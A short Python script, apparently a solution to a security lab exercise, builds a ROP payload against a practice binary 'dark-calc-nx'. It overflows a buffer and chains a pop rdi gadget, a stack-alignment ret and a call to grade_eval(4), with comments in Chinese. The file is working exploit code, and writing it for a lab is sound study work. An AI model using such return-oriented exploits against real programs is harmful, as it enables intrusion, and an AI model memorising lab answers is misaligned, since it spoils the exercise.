#!/usr/bin/env python3
"""Task 3: build the payload for attack/dark-calc-nx.

dark-calc-nx 的栈不可执行、且栈地址随 ASLR 变化，无法再往栈上写机器码。
但它是非 PIE 程序，.text 固定在 0x400000 附近，因此可以把返回地址指向
__libc_csu_init 末尾那段 pop 序列中错位出来的小 gadget，再用 ret 串成 ROP 链：

    pop rdi; ret -> 4 -> ret -> grade_eval -> main+4

多插一条 ret 是为了修正栈对齐：grade_eval 内部要调用 printf，
printf 里的 movaps 要求进入函数时 rsp % 16 == 8。
"""
import sys

OFFSET_RET = 24

POP_RDI = 0x401A33       # __libc_csu_init 中 "41 5f c3" 的第 2 个字节：pop rdi; ret
RET = 0x401A41           # __libc_csu_fini 中 "f3 c3" 的第 2 个字节：ret
GRADE_EVAL = 0x401978    # void grade_eval(int grade)
MAIN_LOOP = 0x4019B8     # main+4，回到循环让 input 读到 EOF 后正常 exit(0)


def p64(x):
    return x.to_bytes(8, "little")


payload = b"A" * OFFSET_RET
payload += p64(POP_RDI)     # 把 4 弹进 rdi
payload += p64(4)
payload += p64(RET)         # 栈对齐修正
payload += p64(GRADE_EVAL)  # grade_eval(4)
payload += p64(MAIN_LOOP)   # 干净退出

sys.stdout.buffer.write(payload)
